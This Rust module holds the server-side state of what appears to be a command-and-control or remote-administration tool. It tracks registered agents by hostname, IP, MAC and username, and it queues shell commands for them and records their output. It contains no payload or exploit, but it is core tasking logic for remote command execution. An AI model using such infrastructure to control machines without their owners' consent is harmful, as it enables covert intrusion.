use crate::models::{Agent, TaskInfo, TaskResult};
use chrono::Utc;
use protocol::RegisterRequest;
use std::collections::{HashMap, VecDeque};
use uuid::Uuid;

pub struct State {
    pub agents: HashMap<Uuid, Agent>,
    pub tasks: HashMap<Uuid, TaskInfo>,
    pub task_queues: HashMap<Uuid, VecDeque<Uuid>>,
    pub school_mode: bool,
}

impl State {
    pub fn new() -> Self {
        State {
            agents: HashMap::new(),
            tasks: HashMap::new(),
            task_queues: HashMap::new(),
            school_mode: false,
        }
    }

    pub fn add_agent(&mut self, req: RegisterRequest) -> Uuid {
        let agent_id = Uuid::new_v4();
        let now = Utc::now();
        let agent = Agent {
            id: agent_id,
            hostname: req.hostname,
            os: req.os,
            os_version: req.os_version,
            mac: req.mac,
            ip: req.ip,
            username: req.username,
            registered_at: now,
            last_seen: now,
        };
        self.agents.insert(agent_id, agent);
        println!("[+] New agent registered: {}", agent_id);
        agent_id
    }

    pub fn update_last_seen(&mut self, agent_id: Uuid) {
        if let Some(agent) = self.agents.get_mut(&agent_id) {
            agent.last_seen = Utc::now();
        }
    }

    pub fn get_next_task(&mut self, agent_id: Uuid) -> Option<protocol::Task> {
        let task_id = self.task_queues.get_mut(&agent_id)?.pop_front()?;
        let task_info = self.tasks.get(&task_id)?;
        Some(protocol::Task {
            task_id: task_info.id,
            command: task_info.command.clone(),
        })
    }

    pub fn add_task(&mut self, agent_id: Uuid, command: String) -> Uuid {
        let task_id = Uuid::new_v4();
        let task_info = TaskInfo {
            id: task_id,
            agent_id,
            command,
            created_at: Utc::now(),
            result: None,
        };
        self.tasks.insert(task_id, task_info);
        self.task_queues
            .entry(agent_id)
            .or_insert_with(VecDeque::new)
            .push_back(task_id);
        println!("[+] Task {} queued for agent {}", task_id, agent_id);
        task_id
    }

    pub fn save_task_result(&mut self, task_id: Uuid, output: String, exit_code: i32) -> bool {
        if let Some(task) = self.tasks.get_mut(&task_id) {
            task.result = Some(TaskResult {
                output,
                exit_code,
                completed_at: Utc::now(),
            });
            println!("[+] Task {} completed with exit code {}", task_id, exit_code);
            true
        } else {
            false
        }
    }

    pub fn list_agents(&self) -> Vec<Agent> {
        self.agents.values().cloned().collect()
    }

    pub fn agent_exists(&self, agent_id: Uuid) -> bool {
        self.agents.contains_key(&agent_id)
    }

    pub fn get_task(&self, task_id: Uuid) -> Option<protocol::TaskInfo> {
        let task = self.tasks.get(&task_id)?;
        Some(protocol::TaskInfo {
            task_id: task.id,
            agent_id: task.agent_id,
            command: task.command.clone(),
            created_at: task.created_at.to_rfc3339(),
            result: task.result.as_ref().map(|r| protocol::TaskResultInfo {
                output: r.output.clone(),
                exit_code: r.exit_code,
                completed_at: r.completed_at.to_rfc3339(),
            }),
        })
    }

    pub fn list_tasks_for_agent(&self, agent_id: Uuid) -> Vec<protocol::TaskInfo> {
        self.tasks
            .values()
            .filter(|t| t.agent_id == agent_id)
            .map(|task| protocol::TaskInfo {
                task_id: task.id,
                agent_id: task.agent_id,
                command: task.command.clone(),
                created_at: task.created_at.to_rfc3339(),
                result: task.result.as_ref().map(|r| protocol::TaskResultInfo {
                    output: r.output.clone(),
                    exit_code: r.exit_code,
                    completed_at: r.completed_at.to_rfc3339(),
                }),
            })
            .collect()
    }
}

impl Default for State {
    fn default() -> Self {
        Self::new()
    }
}
